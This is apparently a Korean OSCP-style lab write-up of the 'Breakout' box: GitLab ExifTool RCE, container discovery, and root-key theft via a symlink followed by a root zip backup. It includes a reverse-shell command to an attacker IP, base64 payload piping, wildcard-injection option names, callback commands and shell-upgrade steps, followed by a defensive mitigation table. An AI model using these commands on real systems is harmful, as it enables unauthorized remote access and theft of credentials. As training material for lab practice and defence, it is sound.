 extracting: /tmp/srv/gitlab/logs/nginx/access.log
  inflating: /tmp/srv/gitlab/logs/nginx/gitlab_access.log
   creating: /tmp/srv/gitlab/logs/prometheus/
  inflating: /tmp/srv/gitlab/logs/prometheus/current
 extracting: /tmp/srv/gitlab/logs/prometheus/lock
   creating: /tmp/srv/gitlab/logs/puma/
  inflating: /tmp/srv/gitlab/logs/puma/current
 extracting: /tmp/srv/gitlab/logs/puma/lock
   creating: /tmp/srv/gitlab/logs/redis-exporter/
  inflating: /tmp/srv/gitlab/logs/redis-exporter/current
 extracting: /tmp/srv/gitlab/logs/redis-exporter/lock
   creating: /tmp/srv/gitlab/logs/sidekiq/
  inflating: /tmp/srv/gitlab/logs/sidekiq/current
 extracting: /tmp/srv/gitlab/logs/sidekiq/lock
  inflating: /tmp/srv/gitlab/logs/alertmanager/current
 extracting: /tmp/srv/gitlab/logs/alertmanager/lock
   creating: /tmp/srv/gitlab/logs/grafana/
   creating: /tmp/srv/gitlab/logs/postgres-exporter/
  inflating: /tmp/srv/gitlab/logs/postgres-exporter/current
 extracting: /tmp/srv/gitlab/logs/postgres-exporter/lock
 extracting: /tmp/srv/gitlab/logs/puma/puma_stderr.log
  inflating: /tmp/srv/gitlab/logs/puma/puma_stdout.log
  inflating: /tmp/srv/gitlab/logs/grafana/current
 extracting: /tmp/srv/gitlab/logs/grafana/lock
  inflating: /tmp/srv/gitlab/logs/alertmanager/@4000000062225c44189a7064.u
  inflating: /tmp/srv/gitlab/logs/gitaly/@4000000062225c4419243204.u
  inflating: /tmp/srv/gitlab/logs/gitlab-exporter/@4000000062225c441a099894.u
  inflating: /tmp/srv/gitlab/logs/gitlab-workhorse/@4000000062225c441970236c.u
  inflating: /tmp/srv/gitlab/logs/grafana/@4000000062225c441a0d6d0c.u
 extracting: /tmp/srv/gitlab/logs/logrotate/@4000000062225c4419cc1a64.u
  inflating: /tmp/srv/gitlab/logs/postgres-exporter/@4000000062225c4419aeca7c.u
  inflating: /tmp/srv/gitlab/logs/postgresql/@4000000062225c4419ea6c1c.u
  inflating: /tmp/srv/gitlab/logs/prometheus/@4000000062225c441a87c944.u
  inflating: /tmp/srv/gitlab/logs/puma/@4000000062225c441a5cc974.u
  inflating: /tmp/srv/gitlab/logs/reconfigure/1646418990.log
  inflating: /tmp/srv/gitlab/logs/redis/@4000000062225c441a19b1ac.u
  inflating: /tmp/srv/gitlab/logs/redis-exporter/@4000000062225c441abc6dd4.u
  inflating: /tmp/srv/gitlab/logs/sidekiq/@4000000062225c441a6531cc.u
  inflating: /tmp/srv/gitlab/logs/sshd/@4000000062225c341459482c.u
  inflating: /tmp/srv/gitlab/logs/alertmanager/@400000006a83e2bc1f2fd554.u
  inflating: /tmp/srv/gitlab/logs/gitaly/@400000006a83e2bc1d93f3ec.u
  inflating: /tmp/srv/gitlab/logs/gitlab-exporter/@400000006a83e2bc1c9cda1c.u
  inflating: /tmp/srv/gitlab/logs/gitlab-workhorse/@400000006a83e2bc1c96e6ac.u
  inflating: /tmp/srv/gitlab/logs/grafana/@400000006a83e2bc1c6a8364.u
 extracting: /tmp/srv/gitlab/logs/logrotate/@400000006a83e2bc1cf283cc.u
  inflating: /tmp/srv/gitlab/logs/postgres-exporter/@400000006a83e2bc1c6101cc.u
  inflating: /tmp/srv/gitlab/logs/postgresql/@400000006a83e2bc1d304464.u
  inflating: /tmp/srv/gitlab/logs/prometheus/@400000006a83e2bc1ca51f4c.u
  inflating: /tmp/srv/gitlab/logs/puma/@400000006a83e2bc1d9cdd2c.u
  inflating: /tmp/srv/gitlab/logs/reconfigure/1722646642.log
  inflating: /tmp/srv/gitlab/logs/redis/@400000006a83e2bc1c58b4cc.u
  inflating: /tmp/srv/gitlab/logs/redis-exporter/@400000006a83e2bc1bcf06b4.u
  inflating: /tmp/srv/gitlab/logs/sidekiq/@400000006a83e2bc1ca0aaac.u
  inflating: /tmp/srv/gitlab/logs/sshd/@4000000066ad807a2881f8e4.u
  inflating: /tmp/srv/gitlab/logs/gitaly/gitaly_ruby_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/sidekiq_client.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/api_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/production_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/application_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/gitlab-rails-db-migrate-2022-03-03-18-31-56.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/exceptions_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/service_measurement.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/grpc.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/production.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/auth.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/application.log.1.gz
  inflating: /tmp/srv/gitlab/logs/nginx/gitlab_access.log.1.gz
 extracting: /tmp/srv/gitlab/logs/puma/puma_stdout.log.1.gz
 extracting: /tmp/srv/gitlab/logs/puma/puma_stderr.log.1.gz
  inflating: /tmp/srv/gitlab/logs/gitaly/keykey
```

> [!danger] 마지막 줄이 전부다 — `inflating: .../gitaly/keykey`
> **`inflating` 이라는 단어가 성공 판정이다.**
> | unzip 표시 | 의미 |
> |---|---|
> | `inflating:` | 압축된 실제 내용이 들어 있다 → 아카이버가 심링크를 **따라가서 파일 내용을 저장했다** |
> | `extracting:` | 크기 0 또는 저장(stored) 항목 |
> | `linking:` | 심링크가 링크 그대로 저장됨 (= `zip -y`) → **이 공격은 실패** |
>
> 만약 `linking: keykey -> /root/.ssh/id_rsa` 로 나왔다면 백업 스크립트가 `-y` 를 쓴 것이고, 다른 경로(와일드카드 인젝션 등)를 찾아야 한다.

두 번째로 중요한 것은 **경로 구조**다. 아카이브 안의 경로가 `srv/gitlab/logs/...` 로 시작한다:

| 컨테이너 안 | 호스트 |
|---|---|
| `/var/log/gitlab` | **`/srv/gitlab/logs`** |
| `/etc/gitlab` | `/srv/gitlab/config` (관례) |
| `/var/opt/gitlab` | `/srv/gitlab/data` (관례) |

**컨테이너 안에서 `mount` 로는 호스트 경로가 안 보인다.** 마운트 포인트만 보인다. 호스트 경로는 이 아카이브의 디렉터리 구조가 알려줬다 — "아카이브의 경로는 아카이브를 만든 프로세스가 본 경로" 이기 때문이다.

`unzip` 플래그:

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-d /tmp/` | 전개 위치 지정 | 현재 디렉터리(`/opt/backups`)에 풀린다. root 소유 디렉터리면 권한 오류, 쓸 수 있으면 증거를 어지럽힌다 |
| (참고) `-l` | 목록만 보기 | 전개 전에 `unzip -l log_backup.zip | grep keykey` 로 먼저 확인하는 편이 안전하다 |
| (참고) `-o` | 덮어쓰기 | 재시도 시 프롬프트 대기로 멈추는 것을 막는다 |

획득한 키로 root 접속 후 flag 확인
```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ vi rootkey

┌──(kali㉿kali)-[~/PG/Breakout]
└─$ chmod 600 rootkey

┌──(kali㉿kali)-[~/PG/Breakout]
└─$ ssh -i rootkey root@192.168.243.182
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Aug 2026 06:20:03 AM UTC

  System load:  0.01              Processes:                328
  Usage of /:   91.2% of 9.78GB   Users logged in:          1
  Memory usage: 81%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   5%                IPv4 address for ens160:  192.168.243.182

  => / is using 91.2% of 9.78GB


39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Fri Mar  4 18:36:31 2022
root@breakout:~# ls
build.sh  data.zip  docker-compose.yml  healthy.sh  proof.txt  snap
root@breakout:~# cat proof.txt
84a74dc9ac82971bfdb19df921c85322
```

#### root 홈이 2-B 가설을 사후 확정한다

```
build.sh  data.zip  docker-compose.yml  healthy.sh  proof.txt  snap
```
`docker-compose.yml` 이 바인드 마운트 정의를, `build.sh` 가 컨테이너 기동을, `healthy.sh` 가 주기 실행 스크립트를 담고 있다. **셸을 잡았으면 이 파일들을 반드시 읽어라** — 백업 주기와 `zip` 명령줄이 여기 적혀 있을 가능성이 높고, 그게 방어 관점 리포트의 근거가 된다.

`root@breakout:~#` 프롬프트의 **`#`** 이 root 증거다. `$` 와 `#` 을 구분하는 습관이 스크린샷 증거에서 중요하다.

#### `root` 로 SSH가 되는 것 자체가 오설정이다

`/etc/ssh/sshd_config` 의 `PermitRootLogin` 이 `prohibit-password`(기본) 이상이면 **키 로그인은 허용**된다. 그래서 root 개인키를 얻는 순간 끝난다.
반대로 `PermitRootLogin no` 였다면 키를 얻고도 못 들어간다. 그 경우의 대안: 얻은 키를 **다른 계정**에 쓰거나, `/root/proof.txt` 자체를 심링크 대상으로 삼아 플래그만 뽑는다.

---

## 5. 플래그

| | 위치 | 값 | 획득 시각 |
|---|---|---|---|
| `local.txt` | `/home/coaran/local.txt` | `75c6c158473b5125a2662cc9fdaa4ba6` | 05:48 UTC |
| `proof.txt` | `/root/proof.txt` | `84a74dc9ac82971bfdb19df921c85322` | 06:20 UTC |

둘 다 표준 위치다. `git` 사용자(컨테이너 안)에는 플래그가 없다 — **컨테이너 안은 채점 대상이 아니다.** 이 사실 자체가 "여기가 최종 목적지가 아니다"라는 신호였다.

> [!tip] 시험 증거 형식 연습
> 실제 시험에서는 플래그를 **한 화면에** 이렇게 찍어야 인정된다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스라면 `root` / `breakout` / `192.168.243.182` / `84a74dc9...` 가 한 스크린샷에 담겨야 한다.
> **`ip a` 는 타겟 IP를 증명하는 부분**이라 빠뜨리면 감점된다. `local.txt` 도 같은 형식으로 따로 찍는다.

---

## 6. 막혔던 지점 / 시행착오

### 이 장의 구분

**①②** 는 원문 기록에 증거가 남아 있는 실제 시행착오다.
**③~⑩** 은 원문에 기록이 없다 — "이 유형에서 흔히 막히는 지점" 으로, 다음에 같은 계열을 만났을 때를 위한 예비 지식이다. 실제로 겪었다고 오해하지 말 것.
**⑪⑫** 는 회고(시간 배분·판단 흐름)다.

### ① [실제] PoC가 에러를 뱉었는데 셸은 붙었다

```
[*] command: bash -i >& /dev/tcp/192.168.45.207/4444 0>&1
[!] Error: request timeout(10)
```

이 줄만 보고 "실패했다"고 판단해 페이로드를 바꾸거나 다른 CVE를 찾기 시작하면 **여기서 30분이 날아간다.** 실제로는 리스너에 이미 셸이 들어와 있었다.

**왜 이런 일이 생기나** — 페이로드가 포그라운드 `bash -i` 라서, 셸이 살아 있는 동안 ExifTool → GitLab → HTTP 응답 경로가 통째로 막힌다. PoC의 10초 타임아웃이 먼저 터진 것이다.

**어떻게 알아챘어야 하는가** — 익스플로잇 창을 보지 말고 리스너 창을 봐라. 판정 기준은 언제나 "리스너에 연결이 들어왔는가"다.

#### 일반화 — 판정 채널과 실행 채널을 분리하라

| 상황 | 잘못된 판정 근거 | 옳은 판정 근거 |
|---|---|---|
| 리버스셸 | HTTP 응답 코드/타임아웃 | 리스너의 `connect to ...` |
| 아웃바운드 확인 | 화면 출력 | 내 쪽 `tcpdump -i tun0` / `python3 -m http.server` 로그 |
| 블라인드 명령 실행 | 응답 본문 | 응답 시간(`sleep`) 또는 내 서버로의 콜백 |

이 볼트의 "응답이 성공을 뜻하지 않는다" 패턴([[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]])에 이 박스를 역방향 사례로 추가한다: **에러가 실패를 뜻하지도 않는다.**

실무 팁: 페이로드를 `bash -c "... &"` 로 **백그라운드**에 던지면 HTTP 응답이 정상으로 돌아온다. 판정이 깔끔해진다.

### ② [실제] `git` 셸에서 멈추면 아무 데도 못 간다 — 컨테이너 인지가 분기점

리버스셸을 잡은 시점의 상태는 이랬다:

```
git@breakout:~/gitlab-workhorse$ whoami
git
```

호스트명이 `breakout` 이고 사용자가 `git` 이라, **호스트에 직접 올라온 것처럼 보인다.** 여기서 `sudo -l` · SUID 탐색 · 커널 익스플로잇으로 직행하면 전부 헛수고다 — 그 셸은 컨테이너 안이고, 컨테이너 안에는 플래그도 없다.

실제로 방향을 튼 계기는 두 가지였다:

1. `~/backups/mykey` — GitLab 서비스 계정 홈에 있을 이유가 없는 **개인키**. "이건 이 박스가 준비한 다음 계단"이라는 신호.
2. `mount | grep gitlab` — **세 디렉터리가 별도 마운트**. 컨테이너 확정.

> [!danger] 호스트명·프롬프트로 컨테이너 여부를 판단하지 마라
> `docker run --hostname breakout` 이면 컨테이너 안에서도 호스트명이 `breakout` 이다. **프롬프트는 아무것도 증명하지 않는다.**
> 셸을 잡으면 `id` 다음에 **바로** 컨테이너 판별을 넣어라:
> ```bash
> cat /proc/1/cgroup ; ls -la /.dockerenv ; mount | grep -E 'overlay|/dev/sd'
> ```
> 컨테이너로 판명되면 우선순위가 완전히 바뀐다: **커널/SUID 탐색은 뒤로 미루고, 마운트·capability·`docker.sock`·네트워크 인접 호스트를 먼저 본다.**

### ③ [흔한 함정] 백업 주기를 모른 채 기다린다

원문 타임라인상 심링크는 05:55, root 접속은 06:20 이다. 그 사이 어딘가에서 백업이 돌았다. `[가정]` **주기는 30분 이하로 보인다** — 다만 백업 스크립트 원문이 기록에 없으므로 확정할 수 없다.

이 유형에서 시간을 태우는 전형적 방식이 **"심어놓고 막연히 기다리는 것"** 이다. 해야 할 일:

```bash
# 백업 파일의 mtime 변화를 감시 → 주기를 실측한다
while true; do ls -la --time-style=full-iso /opt/backups/; sleep 30; done

# 애초에 주기를 추측하지 말고 읽는다
cat /etc/crontab; ls -la /etc/cron.d/; crontab -l; systemctl list-timers
./pspy64 -pf -i 1000
```

**주기를 모르면 20분 기다린 뒤 "안 되나 보다" 하고 접는다.** 주기를 알면 그동안 다른 경로를 병행 탐색한다. 이 차이가 시험에서 크다.

### ④ [흔한 함정] 아카이버가 `zip` 이 아니라 `tar` 였다면 이 공격은 실패한다

| 도구 | 기본 동작 | 심링크 공격 성립 |
|---|---|---|
| `zip -r` | 링크를 따라간다(내용 저장) | **성립** ← 이 박스 |
| `zip -ry` | 링크를 보존 | 실패 |
| `tar -cf` | 링크를 보존 | 실패 |
| `tar -chf` (`--dereference`) | 따라간다 | 성립 |
| `cp -r` | 따라간다 | 성립 |
| `cp -a` / `rsync -a` | 보존 | 실패 |
| `rsync -aL` | 따라간다 | 성립 |

**`unzip -l` / `tar -tvf` 로 아카이브 목록을 먼저 보면 성립 여부를 즉시 안다** — 링크가 `l` 로 나오면 실패, 크기가 실제 파일 크기면 성공이다.

`tar` 이고 링크가 안 통하는 경우의 대안: **와일드카드 인젝션**. `tar cf x.tar *` 같은 명령이 돌면 디렉터리에 `--checkpoint=1` · `--checkpoint-action=exec=sh cmd.sh` 라는 이름의 파일을 만들어 옵션으로 해석시킨다. `zip` 은 `zip -r x.zip * -T -TT 'sh #'` 계열이 있다.

### ⑤ [흔한 함정] `chmod 600` 을 빠뜨리고 "키가 틀렸다"고 오진

```
Permissions 0644 for 'rootkey' are too open. ... This private key will be ignored.
```

SSH가 키를 **무시하고 비밀번호를 묻기** 때문에, 로그를 대충 보면 "키가 안 먹는다"로 읽힌다. 원문에서 `chmod 600` 을 두 번 다 명시적으로 친 것은 정확한 습관이다.

같은 계열의 오진들:

| 증상 | 진짜 원인 |
|---|---|
| `Load key "key": invalid format` | 복사 중 줄바꿈 유실. `-----BEGIN/END-----` 줄과 본문 개행 확인 |
| `Load key: error in libcrypto` | 뒤에 공백/CR(`\r`) 혼입. `dos2unix` 또는 `tr -d '\r'` |
| `Permission denied (publickey)` | 키는 맞는데 사용자명이 틀림 → 키 comment 를 디코드해서 확인 |
| 키가 맞는데 접속 거부 | 서버 `PermitRootLogin no` / `AllowUsers` 제한 |

### ⑥ [흔한 함정] GitLab에 디렉터리 브루트포싱을 돌린다

이미 1장에서 짚었지만 다시 강조할 값어치가 있다. 모든 경로가 `/users/sign_in` 으로 302 되므로 wordlist를 통째로 태워도 유효 경로를 못 가른다. GitLab·Jira·Confluence·Jenkins 같은 완성된 제품을 만나면 퍼징은 낭비다. **버전 → CVE → 익명 API** 순서가 정답이다.

### ⑦ [흔한 함정] 흔적 정리를 안 해서 리포트가 깨진다

이 박스에서 남긴 것: `/var/log/gitlab/gitaly/keykey`(심링크), `/tmp/srv/...`(전개된 로그), 업로드된 악성 이미지, GitLab 로그의 익스플로잇 흔적.

시험이라면 **심어놓은 심링크를 지우기 전에 스크린샷을 남기고**, 정리 후에도 재현 가능한 절차가 노트에 있어야 한다. 원샷 트릭으로 풀면 리버트 후 다시 못 푼다.

### ⑧ [흔한 함정] 리버스셸이 안 붙는다 — 의심 순서를 고정하라

이 박스에서는 4444로 한 번에 붙었지만, **안 붙는 것이 기본값**이라고 생각하는 편이 낫다. 붙지 않을 때 아무 데나 찔러보면 30분이 사라진다. 순서를 고정해두면 5분 안에 원인이 나온다.

| 순서 | 의심 | 확인 명령 | 판정 |
|---|---|---|---|
| 1 | 리스너를 안 띄웠다 / 늦게 띄웠다 | `ss -lntp \| grep 4444` | 가장 흔한 실수 |
| 2 | IP를 잘못 넣었다 (eth0 vs tun0) | `ip a show tun0` | VPN IP여야 한다 |
| 3 | 아웃바운드 포트 차단 | 4444 → 443 · 80 · 53 로 바꿔 재시도 | 1024 미만은 리스너에 `sudo` 필요 |
| 4 | 페이로드 셸이 `sh` 다 | `/dev/tcp` 는 bash 전용 | `bash -c "..."` 로 감싼다 |
| 5 | 인라인 차단/이스케이프 깨짐 | 페이로드를 base64로 감싼다 | `echo <b64>\|base64 -d\|bash` |
| 6 | 명령은 도는데 셸만 안 나간다 | `curl http://<내IP>/ping` 또는 `ping -c1 <내IP>` 로 콜백 | 아웃바운드 자체가 죽었는지 판정 |

#### 아웃바운드 생사 판정은 셸이 아니라 콜백으로 한다

```bash
# 내 쪽
sudo tcpdump -i tun0 icmp or port 80
python3 -m http.server 80
# 타겟 쪽 (RCE 한 방)
curl http://<내IP>/callback ; ping -c1 <내IP>
```
콜백이 오면 아웃바운드는 살아 있고 문제는 페이로드다. 안 오면 포트/방화벽이다. **이 구분을 먼저 하면 나머지가 빨라진다.**

### ⑨ [흔한 함정] TTY 업그레이드를 안 해서 셸을 날린다

이 박스의 첫 셸은 반쪽이었다:

```
bash: cannot set terminal process group (320): Inappropriate ioctl for device
bash: no job control in this shell
```

이 상태에서 `Ctrl+C` 를 누르면 **셸이 통째로 죽는다.** `su`·`ssh`·`sudo` 같은 비밀번호 입력도 안 된다. 이 박스는 곧바로 SSH로 갈아탔기 때문에 문제가 안 됐지만, SSH 경로가 없었다면 필수 단계다.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# python3 이 없으면 (Alpine·최소 설치·컨테이너에서 흔하다)
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/bash";'
/usr/bin/expect -c 'spawn /bin/bash; interact'

# 그 다음 (완전한 TTY)
Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=/bin/bash
stty rows 50 cols 200
```

> [!warning] 컨테이너에는 `python3` 가 없는 경우가 많다
> GitLab 컨테이너처럼 목적이 좁은 이미지는 파이썬·`hostname`·`vim`·`ss` 가 통째로 빠져 있다.
> `python3 -c 'import pty...'` 를 반사적으로 치고 실패하면 **`script -qc /bin/bash /dev/null`** 로 넘어가라. ([[Hawat]]에서 실제로 통했던 방법)

### ⑩ [흔한 함정] 컨테이너 안에서 "호스트 경로"를 모른 채 링크를 심는다

이 박스에서는 링크 대상이 **절대 경로 `/root/.ssh/id_rsa`** 라 문제가 없었다. 하지만 반대 방향 — "내가 심은 파일이 호스트의 어디에 나타나는가" — 는 컨테이너 안에서 알 수 없다. `mount` 는 컨테이너 쪽 마운트 포인트만 보여준다:

```
/dev/sda2 on /var/log/gitlab type ext4 (rw,relatime)
```

호스트 경로가 `/srv/gitlab/logs` 라는 사실은 **아카이브의 디렉터리 구조**가 알려줬다(`srv/gitlab/logs/...`). 다른 확인 경로도 있다:

| 방법 | 얻는 것 |
|---|---|
| 아카이브/백업의 내부 경로 | 아카이브를 만든 호스트 프로세스가 본 경로 ← 이 박스 |
| 호스트 셸을 잡은 뒤 `docker-compose.yml` | `volumes:` 매핑 원문. 가장 정확 |
| `cat /proc/self/mountinfo` | 컨테이너 안에서도 소스 서브패스가 보이는 경우가 있다 |
| `docker inspect <container>` | 호스트 셸이 있고 도커 접근 권한이 있을 때 |

**호스트 경로를 몰라도 절대 경로 링크는 통한다**는 점이 중요하다 — 링크를 읽는 쪽이 자기 루트에서 해석하기 때문이다. 반대로 파일을 특정 호스트 경로에 떨어뜨려야 하는 공격(예: 호스트 cron 디렉터리에 쓰기)은 매핑을 정확히 알아야 한다.

### ⑪ 시간 배분 — 어디서 손절했어야 하는가

| 단계 | 적정 시간 | 초과 시 판단 |
|---|---|---|
| nmap `-p-` + 서비스 식별 | 5분 | — |
| GitLab 버전 확정 + CVE 조회 | 10분 | 버전을 못 얻으면 버전 없이 유명 pre-auth CVE(22205)를 그냥 시도해본다. 확인보다 시도가 빠른 경우다 |
| PoC 실행 → 셸 | 10분 | PoC 3개를 돌려도 안 붙으면 포트를 의심(4444 → 443/80/53). 그래도 안 되면 버전 판정이 틀렸다 |
| `git` 셸 열거 → 키 발견 | 10분 | 홈·`/opt`·`/backup*` 를 10분 안에 훑고, 안 나오면 컨테이너 탈출 각도로 전환 |
| 컨테이너 인지 → 마운트 확인 | 5분 | `mount` 한 줄이면 끝난다. **여기를 건너뛰면 나머지가 전부 헛수고**다 |
| 심링크 심기 → 백업 대기 | 최대 30분 | 백업 주기를 실측하지 못했으면 30분에서 손절하고 다른 경로 병행 |

**총 60~70분이 적정선이다.** 이 박스에서 가장 위험한 시간 함정은 ①(에러를 실패로 오독)과 ③(주기를 모른 채 대기) 둘이다.

### ⑫ 판단 흐름 정리 — 다음에 같은 박스를 만나면

이 박스는 **분기점 네 개**로 요약된다. 각 분기에서 잘못 꺾으면 그 아래는 전부 헛수고다.

```
80 = GitLab
  │
  ├─[분기1] 퍼징할 것인가, 제품으로 다룰 것인가
  │    ✗ gobuster → 전부 302, 소득 없음
  │    ✓ 버전 확정 → CVE 조회 → 익명 API 점검
  │
  ├─[분기2] 익스플로잇 결과를 무엇으로 판정하는가
  │    ✗ PoC 출력(타임아웃 에러) → "실패했다" 오판
  │    ✓ 리스너의 connect 로그 → 성공
  │
  ├─[분기3] git 셸을 호스트로 볼 것인가 컨테이너로 볼 것인가
  │    ✗ sudo -l / SUID / 커널 익스플로잇 → 컨테이너 안이라 무의미
  │    ✓ /proc/1/cgroup · mount → 컨테이너 확정 → 마운트·키 탐색
  │
  └─[분기4] coaran 에서 root 로 무엇을 볼 것인가
       ✗ SUID·sudo·커널 → 이 박스엔 없다
       ✓ "내가 쓸 수 있고 root가 읽는 디렉터리" → 백업 크론 → 심링크
```

#### 한 문장으로 압축하면

**"이 박스는 격리(컨테이너)를 뚫는 문제가 아니라, 격리를 무의미하게 만든 공유 디렉터리를 찾는 문제였다."**
컨테이너 탈출 기법(`docker.sock`·capability·`--privileged`)을 아무리 뒤져도 답이 안 나온다. **`mount` 한 줄이 정답이었다.**

---

## 7. OSCP 시험 관점

1. **`-p-` 전수 스캔은 타협하지 마라.** 이 박스는 22·80뿐이라 손해가 없지만, 습관이 무너지면 [[Hawat]] 같은 고번호 포트 박스에서 통째로 막힌다. `-oN` 으로 항상 파일에 남겨라 — 노트에 오타 난 명령을 적으면 그 노트는 나를 못 구한다.
2. **`nginx`·`Apache` 는 제품명이 아니다.** `http-title` · 리다이렉트 목적지 · `robots.txt` 로 진짜 제품을 판정하라. GitLab의 `robots.txt` 54줄은 그 자체가 지문이다.
3. **완성 제품을 만나면 퍼징하지 말고 "버전 → CVE → 익명 API"로 가라.** GitLab·Jenkins·Confluence·Gitea·Grafana 전부 같다. 디렉터리 브루트포싱은 커스텀 앱에 쓰는 도구다.
4. **인증 없는 사용자 열거 엔드포인트를 항상 찾아라.** GitLab `/api/v4/users/<id>`, Jira `/rest/api/2/user/picker`, Confluence, WordPress `/wp-json/wp/v2/users`, `?author=1`. 여기서 얻은 사용자명이 나중에 SSH·키·비밀번호 재사용의 재료가 된다. 이 박스에서 `coaran` 을 미리 알았기에 키의 주인을 즉시 특정했다.
5. **⚠️ 시험 도구 규칙**: 단일 CVE PoC 스크립트는 허용, Metasploit은 전체 시험 1대 한정이다.
   - 이 박스에 `exploit/multi/http/gitlab_exif_rce` 를 쓰는 것은 **카드 낭비**다. PoC 스크립트나 `curl` 로 충분하다.
   - **PoC는 실행 전에 반드시 읽어라.** 무엇을 어디로 보내는지 모르면 리포트를 못 쓴다.
   - **수동 대안(3-4장)을 익혀둬라.** 스크립트가 파이썬 버전·라이브러리 문제로 깨졌을 때 `curl` 두 방으로 복구할 수 있어야 한다.
6. **"업로드한 파일을 서버가 파싱한다"를 보면 라이브러리 CVE를 떠올려라.** ExifTool(DjVu) · ImageMagick(MVG/MSL) · Ghostscript · ffmpeg · LibreOffice. 웹셸 확장자 우회보다 이쪽이 자주 먹힌다.
7. **판정 채널과 실행 채널을 분리하라.** 익스플로잇이 에러를 뱉어도 리스너를 먼저 확인한다. 반대로 200 OK가 나와도 성공이 아니다. 리버스셸이 안 붙으면 포트를 의심(4444 → 443·80·53)하고, 그 다음 페이로드 셸(`sh` vs `bash`)을 의심한다.
8. **셸을 잡으면 `id` 다음에 컨테이너 판별을 넣어라.**
   ```bash
   cat /proc/1/cgroup; ls -la /.dockerenv; mount | grep -E 'overlay|/dev/sd'
   ```
   컨테이너면 우선순위가 바뀐다 — **커널/SUID보다 마운트·capability·`/var/run/docker.sock`·인접 컨테이너를 먼저** 본다.
9. **바인드 마운트를 찾으면 "누가 이 디렉터리를 읽는가"를 물어라.** 내가 쓸 수 있고 호스트 root가 읽는 디렉터리는 그 자체로 권한상승 통로다.
10. **심볼릭 링크는 경로 문자열이고, 해석은 읽는 쪽이 한다.** 대상이 없어도, 읽을 권한이 없어도 링크는 만들어진다. 저권한 사용자가 root 전용 파일을 아카이브 밖으로 빼내는 고전 기법.
11. **아카이버의 심링크 정책을 표로 외워라.** `zip` 은 따라가고(`-y` 로 보존), `tar` 는 보존하고(`-h` 로 따라감), `cp -a`/`rsync -a` 는 보존한다. `unzip -l` / `tar -tvf` 로 먼저 확인하면 성립 여부를 즉시 안다.
12. **크론/백업 유형은 `pspy` 가 정답 도구다.** 추측 대신 명령줄과 주기를 눈으로 본다. 주기를 실측했으면 대기 중에 다른 경로를 병행 탐색하고, 못 했으면 30분에서 손절하라.
13. **개인키를 주우면 comment 로 주인을 확정하라.** `ssh-keygen -y -f key` 또는 base64 마지막 줄 디코드. 사용자명을 브루트포싱하는 시간을 통째로 없앤다.
14. **키를 저장하면 반사적으로 `chmod 600`.** 안 하면 SSH가 키를 무시하고 비밀번호를 물어 "키가 틀렸다"로 오진한다.
15. **후보를 한 번에 다 걸어라.** 백업 사이클처럼 재시도 비용이 큰 경로에서는 `id_rsa` · `id_ed25519` · `shadow` · `proof.txt` 링크를 동시에 심는다. 실패 비용은 0이고 재시도 비용은 30분이다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| GitLab 취약 버전 방치(CVE-2021-22205) | 13.8.8 / 13.9.6 / 13.10.3 이상으로 즉시 패치. 번들 ExifTool 12.24+ 확인. 자체 관리 인스턴스는 보안 릴리스 공지 구독이 필수 |
| 인증 없는 파일 업로드 경로(`/uploads/user`) | 익명 업로드 비활성화. 최소한 리버스 프록시에서 인증 없는 `POST /uploads/*` 를 차단 |
| 업로드 파일을 원본 그대로 파서에 전달 | 매직바이트 기반 포맷 화이트리스트 → 허용 포맷만 통과. 이미지는 재인코딩(디코드 후 재생성)해서 원본 구조를 파괴 |
| 미디어 파서가 웹 앱과 같은 권한으로 실행 | 파싱을 별도 저권한 워커/컨테이너로 분리. seccomp·AppArmor로 `exec`·네트워크 차단. **이 하나만 있었어도 리버스셸이 못 나갔다** |
| 아웃바운드 무제한 | 서버에서 인터넷/VPN 방향 아웃바운드를 기본 차단. 리버스셸의 전제를 없앤다 |
| `/api/v4/users` 익명 접근 | GitLab 관리 설정에서 "Restrict users API" 활성화. 인스턴스가 사내용이면 전체를 인증 뒤로 |
| 버전 정보 노출 | 로그인 페이지 푸터의 버전 표기 제거. 공격자의 CVE 매칭 비용을 올린다 |
| 서비스 계정 홈에 개인키 방치(`~/backups/mykey`) | 개인키를 서버에 두지 않는다. 불가피하면 패스프레이즈 + 별도 권한 계정. **이 파일 하나가 컨테이너 격리를 무의미하게 만들었다** |
| 컨테이너에 호스트 디렉터리 바인드 마운트 | 로그는 읽기 전용 마운트(`:ro`) 또는 도커 로깅 드라이버/원격 수집으로 대체. 쓰기가 필요하면 named volume 사용 |
| 컨테이너와 호스트가 공유하는 경로를 root 크론이 처리 | 신뢰 경계를 넘는 데이터는 저권한 계정으로 처리. root로 돌 이유가 없다 |
